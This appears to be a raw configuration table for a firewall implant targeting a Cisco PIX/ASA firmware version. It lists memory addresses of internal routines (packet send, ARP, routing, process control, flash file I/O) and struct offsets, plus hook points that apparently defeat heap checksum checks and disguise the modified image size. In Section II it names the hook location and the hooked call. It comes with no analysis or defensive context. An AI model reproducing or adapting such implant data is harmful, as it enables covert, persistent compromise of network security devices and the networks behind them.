; --- SECTION I ---
;
0x40083200            // pix version
0x2173000             // address of implant configuration
0x0   0x08b52780      // allocb
0x1   0x08b52130      // freeb
0x2   0x08065980      // open (7.0(+) this is an array for Channel Stuff)
0x3   0x0856caa0      // ip_put
0x4   0x08065ae0      // close
0x5   0x09388a10      // atoip
0x6   0x093c443c      // memset
0x7   0x093a89d0      // memmove
0x8   0x093a8170      // malloc_call_calloc
0x9   0x093a7f90      // free
0xa   0x08064cd0      // kprintf
0xb   0x00000014      // interface offset in metaframe
0xc   0x00000010      // offset for vlan number in interface struct
0xd   0x00000094      // metaframe offset in block structure
0xe   0x0000007c      // interface semiphore in metaframe
0xf   0x093aa340      // rand
0x15  0x08062290      // process_create
0x16  0x080636f0      // process_suspend
0x17  0x08063cd0      // process_sleep_for
0x18  0x08950690      // show_process
0x19  0xffffffac      // offset to security level in int_struct
0x1a  0x00000000      // cur_t
0x1b  0x04            // channel offset in interface struct
0x1c  0x0c            // PUT offset in channel struct
0x1d  0x24            // offset to dest mac in arp structure
0x1e  0x10            // offset to next hop ip in route structure
0x1f  0x20            // size of route struct
0x20  0x0856fb20      // calc_ip_cksum
0x21  0x085705f0      // arp_loopkup
0x22  0x0856eff0      // set_block_hdr_mac_and_proto
0x23  0x08580f60      // get hardware interface
0x24  0x088ba790      // get next hop
0x25  0x088baa50      // get route
0x26  0x0856ac50      // send_it
0x27  0x08572ca0      // arp_create
0x28  0x089b29b0      // get_hw_iface_2
0x2a  0x64            // pointer to ethernet frame
0x2b  0x5c            // wptr structure offset
0x2c  0x44            // inIfc (incoming interface) structure offset
0x2e  0x000001ac      // offset from cur_t that contains the current context number
0x2f  0x09ebdf40      // pointer to channnel list
0x30  0x09eb2530      // address of NIC database
0x31  0x00000014      // offset to vlan struct in metaframe (interface offset)
0x32  0x00000018      // offset to IP address in int_struct
0x33  0x000000d8      // iface struct adjust from metaframe
0x34  0x09ecc054      // max number of interface cards
0x35  0x09fbeee8      // internal_clock
0x36  0x089b0b60      // get_interface_mac
0x37  0x000000d3      // offset to hardware interface number in interface struct
0x38  0x10            // offset to ip in route structure
0x39  0x00            // offset to interface num in route structure
0x3a  0x00000424      // offset to send channel in channel list
0x3b  0x084a6240      // ifs_read; flash file read routine -- IFS: Read:
0x3c  0x084a6320      // ifs_write; flash file write routine -- IFS: Write:
0x3d  0x084a5880      // ifs_open; flash file open routine -- IFS: Opened: 
0x3e  0x084a6160      // ifs_close; flash file close routine -- IFS: Close: 
0x3f  0x00000040      // offset to next IP fragment pointer in block
0x40  0x09fe4220      // address of context list
0x42  0x093c1e80      // checkheaps checksum location
0x43  0x0855dbc0      // get booted image's filename
0x44  0x083d8fff      // fix image size hook point
0x45  0x01da41c4      // clean image file size
0x46  0xffffffff      // asa fix image size hook point
0x47  0x2c            // offset to filesize in file info struct
0x52  0x085a8480      // ipv6_encap
;
; --- END OF SECTION I ---
;
:EOS:
;
; --- SECTION II ---
;
HookLocation              0x0876822b      // address of our hook point
HookedCall                0x0876c7c0      // called function being hooked
